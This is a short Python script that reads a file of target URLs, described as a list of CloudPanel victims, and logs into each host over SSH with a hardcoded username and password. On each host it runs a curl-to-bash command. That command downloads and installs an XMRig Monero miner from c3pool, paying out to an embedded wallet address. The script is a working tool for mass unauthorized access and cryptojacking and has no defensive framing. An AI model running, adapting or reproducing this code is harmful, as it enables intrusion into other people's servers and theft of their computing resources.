import paramiko

line_break='\n'

def exploit(ip_,index):
    ip=ip_.split('//')[1].split(':')[0].split('/')[0]
    print(index,ip)
    host = ip 
    port = 22  
    username = 'zero'  
    password = 'Root@428'

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    command='curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 424uK1Easzmd5FemPRFSsh1FKopAkXcKY7THFauZQSnMiPvBrDFi5KyBkLfXRzYqqB1bjcc8TsUS99LkZfEGaVjB8Zs4As6'
    try:
        client.connect(hostname=host, port=port, username=username, password=password)

        stdin, stdout, stderr = client.exec_command(command)

        for line in stdout:
            print(line.strip('\n'))

        client.close()
    except Exception as e:
        print(e)


with open(r'D:\C#\VSCODE\python\POC_EXP\批量工具\SSH\Victim_m\CloudPanel.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 0
        end = start+10

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            # print(index, ip)
            exploit(ip,index)